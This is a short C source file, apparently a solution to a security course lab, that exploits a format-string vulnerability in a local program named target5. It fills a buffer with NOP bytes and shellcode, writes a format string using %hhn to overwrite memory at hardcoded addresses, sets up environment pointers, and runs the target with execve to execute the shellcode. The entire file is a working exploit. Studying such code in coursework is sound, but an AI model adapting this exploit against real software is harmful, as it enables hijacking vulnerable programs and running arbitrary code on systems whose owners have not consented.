#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

int main(void)
{
	char *args[3];
	char attack[256];
	memset(attack, '\x90', 256);
	int i;
	for (i = 0; i < 45; i++) {
	        attack[i] = shellcode[i];
	}
	char fstr [] = "%32d%34$hhn %35$hhn%63d%36$hhn%153d%37$hhn";
	memcpy(attack + 60, fstr, strlen(fstr));
	
	char addrs [] = "\x6b\xfe\x21\x20\x00\x00\x00\x00\x6a\xfe\x21\x20\x00\x00"
			"\x00\x00\x68\xfe\x21\x20\x00\x00\x00\x00\x69\xfe\x21\x20"
			"\x00\x00\x00\x00";
	memcpy(attack + 224, addrs, 32);
	
	args[0] = TARGET;
	args[1] = attack;
	args[2] = NULL;
	
	char *env[16];

	env[0] = &attack[229];
	env[1] = &attack[230];
	env[2] = &attack[231];
	env[3] = &attack[232];
	env[4] = &attack[237];
	env[5] = &attack[238];
	env[6] = &attack[239];
	env[7] = &attack[240];
	env[8] = &attack[245];
	env[9] = &attack[246];
	env[10] = &attack[247];
	env[11] = &attack[248];
	env[12] = &attack[253];
	env[13] = &attack[254];
	env[14] = &attack[255];
	env[15] = NULL;

	if (0 > execve(TARGET, args, env))
	fprintf(stderr, "execve failed.\n");

	return 0;
}
